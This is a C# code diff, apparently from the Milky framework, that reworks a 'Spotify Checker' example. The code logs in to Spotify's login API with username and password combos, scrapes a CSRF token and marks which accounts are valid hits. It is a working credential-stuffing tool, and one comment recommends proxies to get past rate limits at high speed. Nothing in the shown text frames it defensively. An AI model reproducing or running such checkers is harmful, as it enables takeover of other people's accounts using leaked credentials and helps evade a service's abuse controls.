@@ -37,50 +37,47 @@ namespace Milky.Examples
                 })
                 .WithCheckingProcess(async (combo, proxy) =>
                 {
-                    var result = CheckResult.Unknown;
-                    Dictionary<string, string> captures = null;
-
-                    while (result == CheckResult.Unknown)
+                    try
                     {
-                        try
+                        using var responseMessage1 = await _httpClient.GetAsync("https://accounts.spotify.com/en/login");
+
+                        string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value; // Don't mind my way of parsing headers, it's a speed trick
+                        if (csrfToken == string.Empty) return (CheckResult.Retry, null, true); // Use proxies if you want to bypass rate limit and reach up to 400K CPM (yes sir)
+
+                        using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                         {
-                            using var responseMessage1 = await _httpClient.GetAsync("https://accounts.spotify.com/en/login");
-
-                            string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value; // Don't mind my way of parsing headers, it's a speed trick
-                            if (csrfToken == string.Empty) continue; // Use proxies if you want to bypass rate limit and reach up to 400K CPM (yes sir)
-
-                            using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
-                            {
-                                Content = new FormUrlEncodedContent(new Dictionary<string, string>
+                            Content = new FormUrlEncodedContent(new Dictionary<string, string>
                                 {
                                     { "username", combo.Username },
                                     { "password", combo.Password },
                                     { "csrf_token", csrfToken }
                                 })
-                            };
+                        };
 
-                            requestMessage2.Headers.TryAddWithoutValidation("Cookie", string.Join(";", $"csrf_token={csrfToken}", "__bon=MHwwfDB8MHwxfDF8MXwx"));
-                            requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");
+                        requestMessage2.Headers.TryAddWithoutValidation("Cookie", string.Join(";", $"csrf_token={csrfToken}", "__bon=MHwwfDB8MHwxfDF8MXwx"));
+                        requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");
 
-                            using var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
+                        using var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
 
-                            var contentString2 = await responseMessage2.Content.ReadAsStringAsync();
+                        var contentString2 = await responseMessage2.Content.ReadAsStringAsync();
 
-                            if (contentString2.Contains("errorInvalidCredentials"))
-                            {
-                                result = CheckResult.Invalid;
-                            }
-                            else if (contentString2.Contains("displayName"))
-                            {
-                                result = CheckResult.Hit;
-                            }
-
-                            // Missing capture, will add later.
+                        if (contentString2.Contains("errorInvalidCredentials"))
+                        {
+                            return (CheckResult.Invalid, null, false);
                         }
-                        catch { }
-                    }
+                        else if (!contentString2.Contains("displayName"))
+                        {
+                            return (CheckResult.Retry, null, true);
+                        }
 
-                    return (result, captures);
+                        // Missing capture, will add later.
+
+                        return (CheckResult.Hit, null, false);
+                    }
+                    catch
+                    {
+                        return (CheckResult.Retry, null, true);
+                    }
                 });
 
             var console = new MilkyConsole()
@@ -88,7 +85,7 @@ namespace Milky.Examples
                 .WithMeta(new Meta
                 {
                     Name = "Spotify Checker",
-                    Version = "v1.0.0",
+                    Version = "Example",
                     Author = "Laiteux"
                 })
                 .WithSettings(new ConsoleSettings
